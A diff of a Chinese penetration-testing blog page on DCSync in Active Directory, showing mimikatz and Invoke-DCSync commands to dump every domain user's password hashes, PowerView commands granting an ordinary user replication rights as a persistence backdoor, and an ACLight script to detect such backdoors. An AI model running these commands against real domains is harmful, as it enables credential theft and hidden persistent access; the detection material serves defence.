@@ -84,10 +84,10 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="域渗透-DCSync的利用">
 <meta property="og:url" content="http://yoursite.com/2019/08/15/域渗透-DCSync的利用/index.html">
-<meta property="og:site_name" content="Hexo">
+<meta property="og:site_name" content="LouisGOGOGO">
 <meta property="og:description" content="域渗透-DCSync的利用0x00 引言DCSync是域渗透常用的技术，本文根据其他人的技术进行测试引用，并整理。 0x01 简介本文内容  利用DCSync导出域内所有用户hash的方法 利用DCSync在域内维持权限 自动化检测DCSync后门  0x02 利用DCSync导出域内所有用户hash的方法利用DCSync的先决条件获取以下任意一个用户权限：  Administrators 组 D">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-15T14:35:06.269Z">
+<meta property="og:updated_time" content="2019-08-15T15:25:59.123Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="域渗透-DCSync的利用">
 <meta name="twitter:description" content="域渗透-DCSync的利用0x00 引言DCSync是域渗透常用的技术，本文根据其他人的技术进行测试引用，并整理。 0x01 简介本文内容  利用DCSync导出域内所有用户hash的方法 利用DCSync在域内维持权限 自动化检测DCSync后门  0x02 利用DCSync导出域内所有用户hash的方法利用DCSync的先决条件获取以下任意一个用户权限：  Administrators 组 D">
@@ -126,7 +126,7 @@
 
 
 
-  <title>域渗透-DCSync的利用 | Hexo</title>
+  <title>域渗透-DCSync的利用 | LouisGOGOGO</title>
   
 
 
@@ -156,7 +156,7 @@
     <div class="custom-logo-site-title">
       <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Hexo</span>
+        <span class="site-title">LouisGOGOGO</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
@@ -278,13 +278,13 @@
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/15/域渗透-DCSync的利用/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
+      <meta itemprop="name" content="LouisGOGOGO">
       <meta itemprop="description" content>
       <meta itemprop="image" content="/images/avatar.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
+      <meta itemprop="name" content="LouisGOGOGO">
     </span>
 
     
@@ -342,22 +342,22 @@
       
 
       
-        <h1 id="域渗透-DCSync的利用"><a href="#域渗透-DCSync的利用" class="headerlink" title="域渗透-DCSync的利用"></a>域渗透-DCSync的利用</h1><h3 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00 引言"></a>0x00 引言</h3><p>DCSync是域渗透常用的技术，本文根据其他人的技术进行测试引用，并整理。</p>
-<h3 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h3><p>本文内容</p>
+        <h1 id="域渗透-DCSync的利用"><a href="#域渗透-DCSync的利用" class="headerlink" title="域渗透-DCSync的利用"></a>域渗透-DCSync的利用</h1><h2 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00 引言"></a>0x00 引言</h2><p>DCSync是域渗透常用的技术，本文根据其他人的技术进行测试引用，并整理。</p>
+<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>本文内容</p>
 <ul>
 <li>利用DCSync导出域内所有用户hash的方法</li>
 <li>利用DCSync在域内维持权限</li>
 <li>自动化检测DCSync后门</li>
 </ul>
-<h3 id="0x02-利用DCSync导出域内所有用户hash的方法"><a href="#0x02-利用DCSync导出域内所有用户hash的方法" class="headerlink" title="0x02 利用DCSync导出域内所有用户hash的方法"></a>0x02 利用DCSync导出域内所有用户hash的方法</h3><h5 id="利用DCSync的先决条件"><a href="#利用DCSync的先决条件" class="headerlink" title="利用DCSync的先决条件"></a>利用DCSync的<strong>先决条件</strong></h5><p>获取以下任意一个用户权限：</p>
+<h2 id="0x02-利用DCSync导出域内所有用户hash的方法"><a href="#0x02-利用DCSync导出域内所有用户hash的方法" class="headerlink" title="0x02 利用DCSync导出域内所有用户hash的方法"></a>0x02 利用DCSync导出域内所有用户hash的方法</h2><h3 id="利用DCSync的先决条件"><a href="#利用DCSync的先决条件" class="headerlink" title="利用DCSync的先决条件"></a>利用DCSync的<strong>先决条件</strong></h3><p>获取以下任意一个用户权限：</p>
 <ul>
 <li>Administrators 组</li>
 <li>Domain Admins组</li>
 <li>Enterprise Admins（企业管理员）组</li>
 <li>域控制器的计算机账户</li>
 </ul>
-<h5 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h5><p>利用DRS(Directory Replication Service,目录复制服务)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据。</p>
-<h5 id="如何利用？"><a href="#如何利用？" class="headerlink" title="如何利用？"></a>如何利用？</h5><ol>
+<h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用DRS(Directory Replication Service,目录复制服务)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据。</p>
+<h3 id="如何利用？"><a href="#如何利用？" class="headerlink" title="如何利用？"></a>如何利用？</h3><ol>
 <li><strong>mimikatz</strong></li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">#导出域内所有用户的hash</span><br><span class="line">lsadump::dcsync /domain:louis.gov /all /csv</span><br><span class="line">#导出域内administrator账户的hash</span><br><span class="line">lsadump::dcsync /domain:louis.gov /user:administrator /csv</span><br></pre></td></tr></table></figure>
@@ -368,19 +368,19 @@
 <p>通过Invoke-ReflectivePEinjection（调用-反射性注射）调用mimikatz.dll中的dcsync功能</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 导出域内所有用户的hash</span><br><span class="line">Invoke-DCSync -DumpForest | ft -wrap -autosize</span><br><span class="line"></span><br><span class="line"># 导出域内administrator账户的hash</span><br><span class="line">Invoke-DCSync -DumpForest -Users @(&quot;administrator&quot;) | ft -wrap -autosize</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x03-利用DCSync-在域内维持权限的方法"><a href="#0x03-利用DCSync-在域内维持权限的方法" class="headerlink" title="0x03 利用DCSync 在域内维持权限的方法"></a>0x03 利用DCSync 在域内维持权限的方法</h3><h5 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a><strong>先决条件</strong></h5><p>获得以下任何一个用户组的用户权限：</p>
+<h2 id="0x03-利用DCSync-在域内维持权限的方法"><a href="#0x03-利用DCSync-在域内维持权限的方法" class="headerlink" title="0x03 利用DCSync 在域内维持权限的方法"></a>0x03 利用DCSync 在域内维持权限的方法</h2><h3 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h3><p>获得以下任何一个用户组的用户权限：</p>
 <ul>
 <li>Domain Admins组</li>
 <li>Enterprise Admins（企业管理员）组</li>
 </ul>
-<h5 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h5><p>向域内的一个普通用户添加如下三条ACE(Access Control Entries，访问控制条目)：</p>
+<h3 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h3><p>向域内的一个普通用户添加如下三条ACE(Access Control Entries，访问控制条目)：</p>
 <ul>
 <li>DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</li>
 <li>DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</li>
 <li>DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c)</li>
 </ul>
 <p>该用户即可获得利用DCSync导出域内所有用户hash的权限</p>
-<h5 id="如何利用？-1"><a href="#如何利用？-1" class="headerlink" title="如何利用？"></a>如何利用？</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># ACL一般都是指对象的安全描述符中的SACL和DACL</span><br><span class="line"># SACL 包含访问控制条目（ACE），用于指定在域控制器的安全事件日志中生成审核记录的访问尝试类型</span><br><span class="line"># DACL 访问控制列表（ACL），由对象的所有者控制，并指定特定用户或组对该对象的访问权限。</span><br><span class="line"># 添加ACE的命令:</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC=test,DC=com&quot; -PrincipalIdentity test1 -Rights DCSync -Verbose</span><br><span class="line"># 删除ACE的命令:</span><br><span class="line">Remove-DomainObjectAcl -TargetIdentity &quot;DC=test,DC=com&quot; -PrincipalIdentity test1 -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure>
+<h3 id="如何利用？-1"><a href="#如何利用？-1" class="headerlink" title="如何利用？"></a>如何利用？</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># ACL一般都是指对象的安全描述符中的SACL和DACL</span><br><span class="line"># SACL 包含访问控制条目（ACE），用于指定在域控制器的安全事件日志中生成审核记录的访问尝试类型</span><br><span class="line"># DACL 访问控制列表（ACL），由对象的所有者控制，并指定特定用户或组对该对象的访问权限。</span><br><span class="line"># 添加ACE的命令:</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC=test,DC=com&quot; -PrincipalIdentity test1 -Rights DCSync -Verbose</span><br><span class="line"># 删除ACE的命令:</span><br><span class="line">Remove-DomainObjectAcl -TargetIdentity &quot;DC=test,DC=com&quot; -PrincipalIdentity test1 -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure>
 
 <p>注入ACL后，该用户有了调用DCSync的权限。</p>
 <ol>
@@ -401,15 +401,15 @@
 <p>tips</p>
 <p>使用wmic 命令在本机实现会出现错误。</p>
 </blockquote>
-<h3 id="0x04-自动化检测DCSync后门"><a href="#0x04-自动化检测DCSync后门" class="headerlink" title="0x04 自动化检测DCSync后门"></a>0x04 自动化检测DCSync后门</h3><p>具有高权限但不在高权限组的用户被称之为Shadow Admin，例如0x03中的域用户test1，仅通过查询高权限组的成员无法发现域内的Shadow Admin</p>
-<h5 id="检测原理"><a href="#检测原理" class="headerlink" title="检测原理"></a>检测原理</h5><p>枚举活动目录（Active Directory）中，所有用户的ACL，标出特权用户</p>
-<h5 id="使用代码"><a href="#使用代码" class="headerlink" title="使用代码"></a>使用代码</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Execute-ACLight2.bat</span></span><br><span class="line"></span><br><span class="line">@echo off</span><br><span class="line">set var=%~d0%~p0%</span><br><span class="line">cd <span class="string">"%var%"</span></span><br><span class="line">set <span class="string">"var=%cd%\ACLight2.psm1"</span></span><br><span class="line">echo.</span><br><span class="line">echo  Welcome, starting Multi-Layered ACLight scan</span><br><span class="line">powershell -noprofile -ExecutionPolicy Bypass <span class="built_in">Import-Module</span> <span class="string">'%var%'</span> -force ; Start-ACLsAnalysis</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-自动化检测DCSync后门"><a href="#0x04-自动化检测DCSync后门" class="headerlink" title="0x04 自动化检测DCSync后门"></a>0x04 自动化检测DCSync后门</h2><p>具有高权限但不在高权限组的用户被称之为Shadow Admin，例如0x03中的域用户test1，仅通过查询高权限组的成员无法发现域内的Shadow Admin</p>
+<h3 id="检测原理"><a href="#检测原理" class="headerlink" title="检测原理"></a>检测原理</h3><p>枚举活动目录（Active Directory）中，所有用户的ACL，标出特权用户</p>
+<h3 id="使用代码"><a href="#使用代码" class="headerlink" title="使用代码"></a>使用代码</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Execute-ACLight2.bat</span></span><br><span class="line"></span><br><span class="line">@echo off</span><br><span class="line">set var=%~d0%~p0%</span><br><span class="line">cd <span class="string">"%var%"</span></span><br><span class="line">set <span class="string">"var=%cd%\ACLight2.psm1"</span></span><br><span class="line">echo.</span><br><span class="line">echo  Welcome, starting Multi-Layered ACLight scan</span><br><span class="line">powershell -noprofile -ExecutionPolicy Bypass <span class="built_in">Import-Module</span> <span class="string">'%var%'</span> -force ; Start-ACLsAnalysis</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
 
-<h5 id="先决条件-1"><a href="#先决条件-1" class="headerlink" title="先决条件"></a>先决条件</h5><ul>
+<h3 id="先决条件-1"><a href="#先决条件-1" class="headerlink" title="先决条件"></a>先决条件</h3><ul>
 <li>powershell v3.0</li>
 <li>域内普通用户权限</li>
 </ul>
-<h5 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h5><p>执行Execute-ACLight2.bat </p>
+<h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>执行Execute-ACLight2.bat </p>
 <p>生成三个文件：</p>
 <ul>
 <li>Privileged Accounts - Layers Analysis.txt</li>
@@ -522,9 +522,9 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
-              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="John Doe">
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="LouisGOGOGO">
             
-              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-author-name" itemprop="name">LouisGOGOGO</p>
               <p class="site-description motion-element" itemprop="description"></p>
           </div>
 
@@ -591,7 +591,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#域渗透-DCSync的利用"><span class="nav-number">1.</span> <span class="nav-text">域渗透-DCSync的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-引言"><span class="nav-number">1.0.1.</span> <span class="nav-text">0x00 引言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-简介"><span class="nav-number">1.0.2.</span> <span class="nav-text">0x01 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-利用DCSync导出域内所有用户hash的方法"><span class="nav-number">1.0.3.</span> <span class="nav-text">0x02 利用DCSync导出域内所有用户hash的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#利用DCSync的先决条件"><span class="nav-number">1.0.3.0.1.</span> <span class="nav-text">利用DCSync的先决条件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用原理"><span class="nav-number">1.0.3.0.2.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如何利用？"><span class="nav-number">1.0.3.0.3.</span> <span class="nav-text">如何利用？</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-利用DCSync-在域内维持权限的方法"><span class="nav-number">1.0.4.</span> <span class="nav-text">0x03 利用DCSync 在域内维持权限的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#先决条件"><span class="nav-number">1.0.4.0.1.</span> <span class="nav-text">先决条件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用原理-1"><span class="nav-number">1.0.4.0.2.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如何利用？-1"><span class="nav-number">1.0.4.0.3.</span> <span class="nav-text">如何利用？</span></a></li></ol></li></ol><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-自动化检测DCSync后门"><span class="nav-number">1.0.5.</span> <span class="nav-text">0x04 自动化检测DCSync后门</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#检测原理"><span class="nav-number">1.0.5.0.1.</span> <span class="nav-text">检测原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用代码"><span class="nav-number">1.0.5.0.2.</span> <span class="nav-text">使用代码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#先决条件-1"><span class="nav-number">1.0.5.0.3.</span> <span class="nav-text">先决条件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#检测方法"><span class="nav-number">1.0.5.0.4.</span> <span class="nav-text">检测方法</span></a></li></ol></li></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#域渗透-DCSync的利用"><span class="nav-number">1.</span> <span class="nav-text">域渗透-DCSync的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-引言"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 引言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-简介"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-利用DCSync导出域内所有用户hash的方法"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 利用DCSync导出域内所有用户hash的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用DCSync的先决条件"><span class="nav-number">1.3.1.</span> <span class="nav-text">利用DCSync的先决条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用原理"><span class="nav-number">1.3.2.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如何利用？"><span class="nav-number">1.3.3.</span> <span class="nav-text">如何利用？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-利用DCSync-在域内维持权限的方法"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 利用DCSync 在域内维持权限的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#先决条件"><span class="nav-number">1.4.1.</span> <span class="nav-text">先决条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用原理-1"><span class="nav-number">1.4.2.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如何利用？-1"><span class="nav-number">1.4.3.</span> <span class="nav-text">如何利用？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-自动化检测DCSync后门"><span class="nav-number">1.5.</span> <span class="nav-text">0x04 自动化检测DCSync后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#检测原理"><span class="nav-number">1.5.1.</span> <span class="nav-text">检测原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用代码"><span class="nav-number">1.5.2.</span> <span class="nav-text">使用代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#先决条件-1"><span class="nav-number">1.5.3.</span> <span class="nav-text">先决条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#检测方法"><span class="nav-number">1.5.4.</span> <span class="nav-text">检测方法</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
@@ -615,7 +615,7 @@
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">John Doe</span>
+  <span class="author" itemprop="copyrightHolder">LouisGOGOGO</span>
 
   
 </div>
